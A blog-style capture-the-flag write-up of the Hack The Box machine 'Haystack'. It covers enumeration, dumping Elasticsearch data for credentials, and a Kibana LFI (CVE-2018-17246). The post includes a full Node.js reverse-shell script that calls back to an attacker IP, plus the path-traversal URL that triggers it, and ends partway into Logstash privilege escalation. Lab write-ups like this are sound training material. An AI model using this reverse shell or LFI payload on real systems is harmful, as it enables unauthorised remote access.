---
layout: post
title: HTB - Haystack Writeup
date: 2019-11-07
image: '/images/posts/htb/haystack/haystack.jpg'
categories: ["writeups"]
tags: ["writeups", "haystack", "htb"]
---

* Box: Haystack
  - Difficulty: Easy
  - Points: 20
  - Release: 29 Jun 2019
  - IP: 10.10.10.115


###Initial Enumeration

####1. Nmap Scanning

Starting with a scan of the target ip address:

`nmap -sC -sV -oA haystack.nmap 10.10.10.115`

<img src="/images/posts/htb/haystack/haystack1.jpg">

The port scan shows ports 22, 80, 9200 are open.
Just from the scan we can identify that port 80 has **text/html** as its context-type whereas port 9200 has **application/json**. This can point towards some kind of API running as API's usually return with **json**.

Loading up the website we see:

<img src="/images/posts/htb/haystack/haystack2.jpg">

In the meantime, we will run a gobuster scan to find any more directories:

####2. Gobuster Scanning

``gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -k``

The scan doesn't find anything interesting.

Next I move to the image in the webpage. I run some basic steganography tools but nothing comes up. That is until I run **strings** on the image and search for a base64 string.

We spot the line of code that looks like base64 so let's throw that into a decoder and see the output.
We get the line ``"la aguja en el pajar es "clave"`` and when we enter that into google translate we get ``the needle in the haystack is "key"``

Next we'll move over to port 9200 which is Elasticsearch.
Visiting the webpage we can see the source code tells us the version is **6.4.2**.

After a quick search of exploits for this version we see the following tool used to dump the elasticsearch database.

https://github.com/taskrabbit/elasticsearch-dump

We candump indices by using the below command:

``curl http://10.10.10.115:9200/_cat/indices?v -s``

We can see 2 indices named **quotes** and **bank** so let's use the elasticdump tool and investigate further.

Based on the below output we generate a dump and we can analyze it by running the **cat** command and using **grep** to find particular keywords.

I start with the word **haystack** and we get the output "There's a needle in this haystack, you have to serach for it" which leads us to believe this is the correct step and to investigate deeper.

The last words of the quotes is a base64 string. Again, let's decode it and see the output:
They look to be credentials:

``User: security``
``Pass: spanish.is.key``

We can use these credentials to SSH in and get the user flag which is located at **/home/security/user.txt**


###Privilege Escalation

Now that we know we are working on an **ELK** stack we can look at the running processes to see **kibana** and **logstash** are running.

Since kibana is run internally, we can port forward it with the below command:

``ssh security@10.10.10.115 -L 5601:127.0.0.1:5601``

We load up the browser and see the Kibana version is **6.4.2**. A quick google search comes up with the following LFI exploit:

We can that it’s running kibana 6.4.2 . A quick google search gets us to CVE-2018–17246.
[CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246)

We can simply make a reverse shell using this JavaScript shell from: https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/

I'm going to go ahead and save that in the tmp folder on the kibana server.

``
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.31", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
``

We then want to navigate to the below in the browser. We should see the listener get a connection back as the user **kibana**

``http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../tmp/shell``

Then you can run ``python -c 'import pty;pty.spawn("/bin/bash")'`` to upgrade to a Python shell.


After running LinEnum.sh we see **logstash** mentioned a few times. Since this box deals with ELK stack we can take a look into **Logstash** to see if there is anything of interest.

In **/etc/logstash**, we find a directory called **conf.d** which holds some key Logstash config files.

The three config files do the following:

I read into Logstash and how it uses these three configuration files.

- input.conf determines the conditions of the input file that Logstash will act on.
- filter.conf defines a regex that matches the contents of the input file.
- output.conf determines what actions will be taken on the input file
